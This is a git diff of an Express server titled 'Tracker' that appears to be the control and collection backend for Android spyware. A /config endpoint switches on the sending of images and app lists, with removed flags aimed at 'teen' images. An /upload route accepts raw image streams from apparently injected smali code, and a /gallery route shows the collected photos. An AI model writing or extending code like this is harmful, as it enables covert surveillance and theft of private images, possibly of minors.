@@ -54,19 +54,11 @@ function parseApps(input) {
   }
 }
 
-/* ================= 🔥 CONFIG CONTROL ================= */
-/*
-FORMAT:
-sendImages | sendApps | teenImages | teenApps
-
-Example:
-1|1|0|0 → normal ON, teen OFF
-0|0|1|1 → only teen ON
-1|0|1|0 → mixed
-*/
+/* ================= 🔥 CONFIG (NEW) ================= */
 
 app.get('/config', (req, res) => {
-  res.send("0|0|1|1"); 
+  // format: sendImages|sendApps
+  res.send("1|0"); 
 });
 
 /* ================= TRACK ================= */
@@ -97,7 +89,7 @@ app.post('/upload', (req, res) => {
 
   const contentType = req.headers['content-type'] || "";
 
-  // 🔴 MULTIPART (file upload)
+  // MULTIPART
   if (contentType.includes("multipart")) {
     return upload.single('file')(req, res, () => {
 
@@ -124,7 +116,7 @@ app.post('/upload', (req, res) => {
     });
   }
 
-  // 🔥 RAW STREAM (smali direct)
+  // RAW STREAM
   let ext = ".jpg";
 
   if (contentType.includes("png")) ext = ".png";
@@ -163,7 +155,7 @@ app.post('/upload', (req, res) => {
   });
 });
 
-/* ================= 📸 GALLERY ================= */
+/* ================= GALLERY ================= */
 
 app.get('/gallery', (req, res) => {
 
@@ -243,7 +235,7 @@ app.get('/health', (req, res) => {
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (FULL CONTROL MODE)");
+  res.send("Tracker running (config + gallery + uploads)");
 });
 
 /* ================= START ================= */
